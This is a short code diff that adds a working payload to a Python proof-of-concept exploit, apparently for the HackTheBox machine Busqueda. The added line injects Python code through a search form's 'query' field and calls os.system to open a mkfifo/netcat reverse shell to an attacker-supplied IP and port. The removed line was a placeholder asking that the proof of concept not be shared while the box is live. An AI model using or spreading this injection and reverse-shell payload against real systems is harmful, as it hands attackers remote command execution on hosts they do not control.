@@ -12,8 +12,8 @@ def main():
         'Content-Type': 'application/x-www-form-urlencoded',
     }
 
-    data = f'POC is not to be shared unless HTB:Busqueda is live for 7 days'
-
+    data = f'engine=Google&query=a\',+__import__("os").system("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/bash+-i+2>%261|nc+{attacker_ip}+{attacker_port}+>/tmp/f"))%23'
+    
     response = requests.post(f'{victim_url}', headers=headers, data=data)
 
 try:
